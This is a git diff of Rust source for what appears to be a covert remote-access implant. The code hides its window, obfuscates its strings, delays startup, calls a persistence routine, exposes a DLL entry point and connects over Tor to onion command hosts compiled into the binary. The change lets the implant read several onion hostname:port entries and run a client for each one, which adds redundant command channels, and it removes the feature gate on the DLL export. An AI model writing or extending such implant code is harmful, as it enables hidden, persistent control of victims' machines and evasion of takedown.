@@ -41,8 +41,25 @@ const CREATE_NO_WINDOW: u32 = 0x08000000;
 
 const CONFIG_HOSTNAME: &[u8] = include_bytes!("../config/hostname");
 
-fn get_onion_host() -> String {
-    String::from_utf8_lossy(CONFIG_HOSTNAME).trim().to_string()
+fn parse_onion_line(line: &str) -> Option<ClientConfig> {
+    let line = line.trim();
+    if line.is_empty() || line.starts_with('#') {
+        return None;
+    }
+    let (hostname, port_str) = line.rsplit_once(':')?;
+    let port: u16 = port_str.parse().ok()?;
+    if hostname.is_empty() {
+        return None;
+    }
+    Some(ClientConfig {
+        onion: hostname.to_string(),
+        port,
+    })
+}
+
+fn get_onion_configs() -> Vec<ClientConfig> {
+    let content = String::from_utf8_lossy(CONFIG_HOSTNAME);
+    content.lines().filter_map(parse_onion_line).collect()
 }
 
 
@@ -50,16 +67,6 @@ fn get_onion_host() -> String {
 pub struct ClientConfig {
     pub onion: String,
     pub port: u16,
-}
-
-
-impl Default for ClientConfig {
-    fn default() -> Self {
-        Self {
-            onion: get_onion_host(),
-            port: 1337,
-        }
-    }
 }
 /// Initialize Tor client
 async fn init_tor() -> Result<TorClient<PreferredRuntime>> {
@@ -509,7 +516,24 @@ async fn netclient_impl() -> c_int {
     println!("{}{}{}", astr!("Delaying startup by "), startup_delay, astr!("s"));
     sleep(Duration::from_secs(startup_delay)).await;
     let _ = persist::persist();
-    let _ = netclient_run(ClientConfig::default()).await;
+
+    let configs = get_onion_configs();
+    if configs.is_empty() {
+        println!("{}", &astr!("No valid hostname:port entries in config"));
+        return 1;
+    }
+
+    println!("{}{}{}", astr!("Starting "), configs.len(), astr!(" netclient instance(s)"));
+    let mut handles = Vec::new();
+    for cfg in configs {
+        handles.push(tokio::spawn(async move {
+            netclient_run(cfg).await
+        }));
+    }
+
+    for h in handles {
+        let _ = h.await;
+    }
     0
 }
 pub async fn netclient() -> c_int {
@@ -523,7 +547,7 @@ pub async fn netclient() -> c_int {
     0
 }
 
-#[cfg(feature = "shared-lib")]
+//#[cfg(feature = "shared-lib")]
 pub async fn netclient_dll() -> c_int {
     netclient_impl().await;
     0
